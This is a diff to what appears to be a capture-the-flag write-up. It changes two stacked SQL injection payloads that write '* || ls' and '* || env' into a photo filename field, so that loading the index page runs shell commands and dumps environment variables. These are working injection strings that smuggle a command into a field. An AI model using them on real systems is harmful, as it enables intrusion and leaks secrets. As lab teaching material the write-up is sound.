@@ -45,7 +45,7 @@ Successfully updated file title 3.
 Now we can update **filename** to perform RCE.
 
 ```sql
-id=1;UPDATE photos SET filename='* || ls > test.txt' WHERE id=3;COMMIT;--
+id=1;UPDATE photos SET filename='* || ls > test' WHERE id=3;COMMIT;--
 ```
 
 Visit **INDEX** page to execute the command.
@@ -63,7 +63,7 @@ Dockerfile files main.py main.pyc prestart.sh requirements.txt test uwsgi.ini
 ## 0x03 FLAG
 
 ```sql
-id=1;UPDATE photos SET filename='* || env > test.txt' WHERE id=3;COMMIT;--
+id=1;UPDATE photos SET filename='* || env > test' WHERE id=3;COMMIT;--
 ```
 
 Visit **INDEX** page to execute the command.
